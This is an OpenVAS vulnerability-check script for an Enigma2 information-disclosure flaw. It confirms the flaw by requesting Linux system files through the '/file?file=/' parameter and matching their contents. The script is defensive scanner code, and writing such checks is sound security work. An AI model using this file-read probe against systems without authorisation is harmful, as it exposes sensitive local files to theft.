###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_enigma2_51330.nasl 11657 2018-09-27 13:32:51Z cfischer $
#
# Enigma2 'file' Parameter Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103381");
  script_bugtraq_id(51330);
  script_version("$Revision: 11657 $");
  script_cve_id("CVE-2012-1024", "CVE-2012-1025");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("Enigma2 'file' Parameter Information Disclosure Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51330");
  script_xref(name:"URL", value:"http://dream.reichholf.net/wiki/Enigma2");

  script_tag(name:"last_modification", value:"$Date: 2018-09-27 15:32:51 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-01-10 10:48:24 +0100 (Tue, 10 Jan 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("Host/runs_unixoide");
  script_tag(name:"summary", value:"Enigma2 is prone to an information-disclosure vulnerability because it
  fails to sufficiently validate user-supplied data.");
  script_tag(name:"impact", value:"An attacker can exploit this issue to download local files in the
  context of the webserver process. This may allow the attacker to
  obtain sensitive information. Other attacks are also possible.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are
  to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

url = "/web/movielist.rss";

if(http_vuln_check(port:port, url:url,pattern:"Enigma2 Movielist")) {

  files = traversal_files("linux");

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = "/file?file=/" + file;

    if(http_vuln_check(port:port, url:url,pattern:pattern)) {
      report = report_vuln_url(port:port, url:url);
      security_message(data:report, port:port);
      exit(0);
    }
  }
}

exit(99);
